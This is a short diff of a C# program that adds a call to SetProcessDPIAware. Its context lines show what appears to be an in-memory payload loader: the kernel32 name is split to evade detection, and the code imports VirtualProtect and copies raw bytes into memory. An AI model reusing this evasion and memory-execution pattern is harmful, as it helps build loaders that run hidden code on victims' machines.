@@ -28,6 +28,9 @@ namespace csharp
         [DllImport("ke" + "rne" + "l32")]
         private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
+        [DllImport("user32.dll")]
+        public static extern bool SetProcessDPIAware();
+
         private static void CopyData(byte[] dataStuff, IntPtr somePlaceInMem, int holderFoo = 0)
         {
             Marshal.Copy(dataStuff, holderFoo, somePlaceInMem, dataStuff.Length);
@@ -80,6 +83,7 @@ namespace csharp
             bool execMain = false;
 
             Thing();
+            SetProcessDPIAware();
 
             try
             {
